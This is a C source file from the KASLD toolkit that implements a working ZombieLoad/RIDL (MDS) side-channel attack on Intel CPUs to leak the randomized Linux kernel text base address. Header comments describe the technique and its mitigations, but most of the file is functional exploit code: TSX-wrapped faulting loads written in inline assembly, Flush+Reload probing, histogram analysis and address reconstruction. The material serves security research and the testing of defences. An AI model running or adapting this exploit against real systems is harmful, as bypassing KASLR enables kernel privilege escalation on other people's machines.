// This file is part of KASLD - https://github.com/bcoles/kasld
//
// ZombieLoad / RIDL side-channel KASLR bypass.
//
// Exploits Microarchitectural Data Sampling (MDS) vulnerabilities in Intel
// CPUs to leak kernel pointers from CPU line fill buffers (LFBs). After
// triggering kernel execution via a fast syscall (getuid), a faulting load
// from a non-present page within a TSX transaction causes the CPU to
// transiently forward stale LFB data. The leaked byte is encoded into a
// 256-entry Flush+Reload probe array for recovery after the transaction
// aborts.
//
// By sampling at each of the 64 byte offsets within a cache line, the
// attack identifies positions where kernel pointers persist in the LFB.
// Kernel text addresses on x86_64 (0xFFFFFFFF8xxxxxxx) produce a
// distinctive pattern: four consecutive offsets dominated by 0xFF (the
// upper bytes), with the adjacent lower offsets revealing the
// KASLR-randomized base.
//
// Unlike Data Bounce and EchoLoad (which probe whether specific kernel
// addresses are mapped), ZombieLoad samples arbitrary data from CPU
// internal buffers — a fundamentally different microarchitectural path.
// The leaked data may include kernel pointers, stack contents, or other
// values that passed through the LFB during recent kernel execution.
//
// TSX (RTM) is required for efficient fault suppression. The faulting
// load within a TSX transaction aborts the transaction, but the CPU may
// forward stale LFB data to the transient execution path before the
// abort is architecturally visible.
//
// On CPUs with MDS mitigations (VERW-based buffer clearing on privilege
// transitions), the kernel clears LFBs before returning to userspace,
// defeating the attack. Hardware fixes in Intel Ice Lake (gen 10) and
// later eliminate the vulnerability entirely.
//
// Leak primitive:
//   Data leaked:      kernel text virtual base address (via stale LFB data)
//   Kernel subsystem: microarchitecture — line fill buffer data sampling
//   Data structure:   kernel pointers in LFB (syscall table entry, stack, etc.)
//   Address type:     virtual (kernel text)
//   Method:           timing (Flush+Reload on 256-entry probe array)
//   Status:           mitigated via VERW on supported CPUs; hardware fix
//                     in Ice Lake+
//   Access check:     N/A (hardware side-channel — no kernel gate)
//   Source:           N/A (hardware side-channel)
//
// Mitigations:
//   MDS mitigations (VERW buffer clearing): kernel clears LFBs on every
//   privilege transition. Enabled by default when CPU microcode supports it.
//   Hardware fix in Intel Ice Lake and later (gen 10+).
//   TSX disabled (tsx=off, microcode, or CONFIG_X86_INTEL_TSX_MODE_OFF)
//   prevents the TSX-based attack.
//   AMD CPUs are not vulnerable to MDS.
//
// References:
// https://zombieloadattack.com/
// https://mdsattacks.com/
// https://software.intel.com/security-software-guidance/insights/deep-dive-intel-analysis-microarchitectural-data-sampling
// https://github.com/IAIK/ZombieLoad
// https://github.com/vusec/ridl
//
// Papers:
// Schwarz, Lipp, Moghimi, Van Bulck, Stecklina, Prescher, Gruss.
// "ZombieLoad: Cross-Privilege-Boundary Data Sampling" (CCS 2019)
//
// Van Schaik, Milburn, Österlund, Frigo, Maisuradze, Razavi, Bos,
// Giuffrida.
// "RIDL: Rogue In-Flight Data Load" (S&P 2019)
// ---
// <bcoles@gmail.com>

#if !defined(__x86_64__) && !defined(__amd64__)
#error "Architecture is not supported"
#endif

#define _GNU_SOURCE
#include "include/kasld.h"
#include "include/kasld_internal.h"
#include "include/sidechannel.h"
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

/* =========================================================================
 * Configuration
 * =========================================================================
 */

/* Number of MDS samples per cache-line offset. Higher values improve
 * statistical confidence but increase runtime. At 2000 samples with
 * ~13 us per sample: 64 offsets x 2000 = 128,000 iterations ~ 1.7 s. */
#define MDS_SAMPLES 2000

/* Minimum hit count for a byte value to be considered signal (not noise).
 * Values appearing in fewer than MDS_MIN_HITS samples are ignored. */
#define MDS_MIN_HITS (MDS_SAMPLES / 20)

/* Number of independent sampling runs. Each produces a candidate address;
 * the result that appears in a majority of runs is reported. */
#define MDS_RUNS 3

KASLD_EXPLAIN(
    "ZombieLoad exploits Microarchitectural Data Sampling (MDS) in Intel "
    "CPUs: after a syscall populates CPU line fill buffers (LFBs) with "
    "kernel data, a faulting load from a non-present page within a TSX "
    "transaction causes the CPU to transiently forward stale LFB data. "
    "A Flush+Reload probe array recovers the leaked bytes. Scanning all "
    "64 cache-line offsets identifies positions where kernel text pointers "
    "persist, revealing the KASLR base. Mitigated by MDS buffer clearing "
    "(VERW) and hardware fixes in Intel Ice Lake+.");

KASLD_META("method:timing\n"
           "addr:virtual\n"
           "status:experimental\n"
           "hardware:MDS-vulnerable Intel CPU + TSX required\n"
           "cve:CVE-2018-12130\n");

/* =========================================================================
 * MDS vulnerability / mitigation status
 *
 * Returns:  0 = vulnerable (no mitigation active)
 *           1 = mitigated (VERW buffer clearing active)
 *           2 = not affected (hardware fix)
 *          -1 = unknown (sysfs not available)
 * =========================================================================
 */
static int check_mds_status(void) {
  FILE *f = fopen("/sys/devices/system/cpu/vulnerabilities/mds", "r");
  if (!f)
    return -1;

  char buf[256];
  if (!fgets(buf, sizeof(buf), f)) {
    fclose(f);
    return -1;
  }
  fclose(f);

  if (strstr(buf, "Not affected"))
    return 2;
  if (strstr(buf, "Vulnerable"))
    return 0;
  if (strstr(buf, "Mitigation"))
    return 1;
  return -1;
}

/* =========================================================================
 * Faulting page
 *
 * A page mapped with PROT_NONE (no read/write/execute). Any load from
 * this page triggers a fault. Within a TSX transaction, the fault aborts
 * the transaction — but the CPU may forward stale LFB data to the
 * transient execution path before the abort is architecturally visible.
 *
 * The offset within this page (0–63) selects which byte of the LFB's
 * cache line entry is sampled.
 * =========================================================================
 */

static void *fault_page;

/* =========================================================================
 * Histograms: for each cache-line offset (0–63), how many times each
 * byte value (0–255) was observed in the LFB.
 * =========================================================================
 */

static int histograms[64][256];

/* =========================================================================
 * MDS sample primitive
 *
 * Triggers a syscall to populate LFBs with kernel data, then performs
 * a faulting load from fault_page + off within TSX. The leaked byte
 * is encoded into the probe array via Flush+Reload.
 * =========================================================================
 */

static void mds_sample_at(int off) {
  /* Flush all 256 probe lines */
  for (int i = 0; i < 256; i++)
    flush(probe + i * 4096);

  /* Trigger kernel execution — getuid is fast and causes the kernel to
   * load the syscall table entry (a kernel text pointer), current_task,
   * and other pointers that flow through the LFB. */
  syscall(SYS_getuid);

  /* MDS primitive: faulting load from non-present page within TSX.
   *
   * The movzbl loads one byte from fault_page + off. Because the page
   * has PROT_NONE, this faults. During the transient window before the
   * TSX abort, the CPU may forward stale LFB data as the load result.
   *
   * The leaked byte is shifted left by 12 (× 4096) to index a unique
   * page in the probe array. The jz skips zero — the most common noise
   * value — to avoid polluting the histogram. */
  if (xbegin_wrapper() == ~0u) {
    __asm__ volatile("movzbl (%[fp]), %%eax\n\t"
                     "shl $12, %%rax\n\t"
                     "jz 1f\n\t"
                     "movzbl (%[pr], %%rax, 1), %%eax\n\t"
                     "1:"
                     :
                     : [fp] "r"((char *)fault_page + off), [pr] "r"(probe)
                     : "rax", "memory");
    xend_wrapper();
  }

  /* Reload: find which probe line was cached (at most one per sample).
   * Start at 1 — zero is skipped in the encoding above. */
  for (int i = 1; i < 256; i++) {
    if (flush_reload(probe + i * 4096)) {
      histograms[off][i]++;
      break;
    }
  }
}

/* =========================================================================
 * Address reconstruction
 *
 * After sampling, analyze histograms to find kernel text pointers.
 *
 * Kernel text addresses on x86_64 have the form 0xFFFFFFFF8xxxxxxx.
 * In little-endian memory, a pointer at cache-line offset P occupies:
 *
 *   P+0: byte 0 (LSB)  = 0x00  (2 MiB aligned)
 *   P+1: byte 1        = 0x00  (2 MiB aligned)
 *   P+2: byte 2        = KASLR-randomized (low byte of slide)
 *   P+3: byte 3        = KASLR-randomized (high byte of slide)
 *   P+4: byte 4        = 0xFF
 *   P+5: byte 5        = 0xFF
 *   P+6: byte 6        = 0xFF
 *   P+7: byte 7 (MSB)  = 0xFF
 *
 * We scan each possible 8-byte-aligned position within the 64-byte
 * cache line, looking for the 0xFF signature in the upper bytes.
 * =========================================================================
 */

static unsigned long analyze_histograms(void) {
  /* Find dominant non-zero value and its count for each offset */
  int peak_val[64];
  int peak_cnt[64];

  for (int off = 0; off < 64; off++) {
    peak_val[off] = 0;
    peak_cnt[off] = 0;
    for (int v = 1; v < 256; v++) {
      if (histograms[off][v] > peak_cnt[off]) {
        peak_cnt[off] = histograms[off][v];
        peak_val[off] = v;
      }
    }
  }

  /* Check each 8-byte-aligned position for kernel text signature.
   * Kernel pointers are always 8-byte aligned, so the pointer's position
   * within the cache line is always a multiple of 8. */
  for (int pos = 0; pos <= 56; pos += 8) {
    /* Bytes 4–7 (upper 32 bits) must all be 0xFF with high confidence */
    int ff_match = 0;
    for (int b = 4; b < 8; b++) {
      if (peak_val[pos + b] == 0xFF && peak_cnt[pos + b] >= MDS_MIN_HITS)
        ff_match++;
    }

    if (ff_match < 3) /* require at least 3 of 4 upper bytes = 0xFF */
      continue;

    /* Byte 3: must be in kernel text range [0x80, 0xBF] */
    int byte3 = peak_val[pos + 3];
    if (byte3 < 0x80 || byte3 > 0xBF)
      continue;
    if (peak_cnt[pos + 3] < MDS_MIN_HITS)
      continue;

    /* Byte 2: the KASLR low byte. May be 0x00 for bases near the
     * default (0xFFFFFFFF81000000), in which case our histogram has
     * no signal (we skip zero in encoding). A low peak count means
     * byte 2 is likely 0x00. */
    int byte2 = 0;
    if (peak_cnt[pos + 2] >= MDS_MIN_HITS)
      byte2 = peak_val[pos + 2];

    /* Reconstruct address */
    unsigned long addr = 0xFFFFFFFF00000000UL | ((unsigned long)byte3 << 24) |
                         ((unsigned long)byte2 << 16);

    /* Align to KERNEL_ALIGN (2 MiB) */
    addr &= ~(KERNEL_ALIGN - 1);

    /* Validate against expected kernel text range */
    if (addr >= KERNEL_BASE_MIN && addr < KERNEL_BASE_MAX)
      return addr;
  }

  return 0;
}

/* =========================================================================
 * main
 * =========================================================================
 */
int main(void) {
  if (!getenv("KASLD_EXPERIMENTAL")) {
    fprintf(stderr, "[-] zombieload: experimental component; "
                    "set KASLD_EXPERIMENTAL=1 to enable\n");
    return KASLD_EXIT_UNAVAILABLE;
  }

  if (!is_intel_cpu()) {
    fprintf(stderr,
            "[-] zombieload: not an Intel CPU; MDS is Intel-specific\n");
    return KASLD_EXIT_UNAVAILABLE;
  }

  if (!has_rtm()) {
    fprintf(stderr, "[-] zombieload: TSX/RTM not available; "
                    "required for MDS fault suppression\n");
    return KASLD_EXIT_UNAVAILABLE;
  }

  int mds_status = check_mds_status();
  if (mds_status == 2) {
    fprintf(stderr, "[-] zombieload: CPU not affected by MDS (hardware fix)\n");
    return KASLD_EXIT_UNAVAILABLE;
  }
  if (mds_status == 1) {
    fprintf(stderr, "[.] zombieload: MDS mitigations active "
                    "(VERW buffer clearing); attack may not work\n");
  } else if (mds_status == 0) {
    fprintf(stderr, "[.] zombieload: MDS mitigations not active; "
                    "CPU may be vulnerable\n");
  }

  fprintf(stderr, "[.] zombieload: using TSX abort mode\n");

  memset(probe, 1, sizeof(probe));

  cache_miss_threshold = detect_flush_reload_threshold();
  fprintf(stderr, "[.] zombieload: cache miss threshold: %zu cycles\n",
          cache_miss_threshold);

  /* Allocate faulting page (PROT_NONE — not readable) */
  fault_page = mmap(NULL, 4096, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (fault_page == MAP_FAILED) {
    fprintf(stderr, "[-] zombieload: failed to map faulting page\n");
    return 0;
  }

  /* Pin to a single core to reduce noise from cross-core LFB traffic */
  pin_cpu(1);

  /* Run multiple independent sampling passes and majority-vote.
   * Each run collects fresh histograms at all 64 cache-line offsets
   * and produces a candidate kernel text address. */
  unsigned long results[MDS_RUNS];

  for (int run = 0; run < MDS_RUNS; run++) {
    memset(histograms, 0, sizeof(histograms));

    for (int off = 0; off < 64; off++) {
      for (int s = 0; s < MDS_SAMPLES; s++)
        mds_sample_at(off);
    }

    results[run] = analyze_histograms();
  }

  /* Majority vote: select the address that appears most often */
  unsigned long addr = 0;
  int best_count = 0;
  for (int i = 0; i < MDS_RUNS; i++) {
    if (!results[i])
      continue;
    int count = 0;
    for (int j = 0; j < MDS_RUNS; j++) {
      if (results[j] == results[i])
        count++;
    }
    if (count > best_count) {
      best_count = count;
      addr = results[i];
    }
  }

  munmap(fault_page, 4096);

  if (!addr) {
    if (mds_status == 1)
      fprintf(stderr, "[-] zombieload: no kernel address found "
                      "(MDS mitigations likely effective)\n");
    else
      fprintf(stderr, "[-] zombieload: no kernel address found "
                      "(CPU may not be vulnerable)\n");
    return 0;
  }

  fprintf(stderr, "[+] zombieload: kernel text base = 0x%016lx\n", addr);
  kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_TEXT, addr,
               "zombieload [kernel text]");

  return 0;
}
